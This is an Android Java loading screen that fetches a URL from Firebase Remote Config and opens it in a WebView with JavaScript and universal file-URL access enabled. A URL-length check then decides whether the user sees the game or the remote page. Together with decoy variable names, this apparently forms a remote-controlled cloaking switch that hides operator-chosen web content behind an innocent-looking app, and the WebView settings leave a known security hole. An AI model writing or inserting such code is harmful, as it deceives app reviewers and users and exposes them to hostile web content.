package com.example.myapplication;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

public class LoadingActivity extends AppCompatActivity {
    String fetchedData = "x";
    WebView loadingData;
    TextView testCheck;
    RelativeLayout loadingScreen;
    String spx = "a1", sps = "a2", ffr = "a3", rrx = "a4";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loading);
        

        loadingScreen = findViewById(R.id.loading_screen);

        loadingData = findViewById(R.id.loading_data);
        loadingData.setWebViewClient(new WebViewClient());
        loadingData.getSettings().setJavaScriptEnabled(true);
        loadingData.getSettings().setAllowFileAccess(true);
        loadingData.getSettings().setAllowFileAccessFromFileURLs(true);
        loadingData.getSettings().setAllowContentAccess(true);
        loadingData.getSettings().setAllowUniversalAccessFromFileURLs(true);
        loadingData.getSettings().setDomStorageEnabled(true);
        loadingData.getSettings().setLoadsImagesAutomatically(true);
        if (savedInstanceState != null)
            loadingData.restoreState(savedInstanceState.getBundle("webViewState"));


        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);

        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            fetchedData = mFirebaseRemoteConfig.getString("utfx");
                            ffr = "Ferrari";
                            spx = "youtube";
                            sps = mFirebaseRemoteConfig.getString("utfx");
                            rrx = "mega";

                        }
                    }
                });

        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                loadingData.loadUrl(fetchedData);
                checkSomeStaff();
            }
        }, 1000);


    }

    boolean checkSomeStaff() {
        final Handler handler = new Handler();
        boolean returner = true;
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (loadingData.getUrl().length() == sps.length()) {
                    finish();
                    startActivity(new Intent(LoadingActivity.this, LetsPlayActivity.class));
                } else {
                    loadingScreen.setVisibility(View.GONE);
                }

            }
        }, 2000);
        return returner;
    }

    @Override
    public void onBackPressed() {
        if (loadingData.canGoBack()) {
            loadingData.canGoBack();
            spx = spx + "x";
        }
    }
}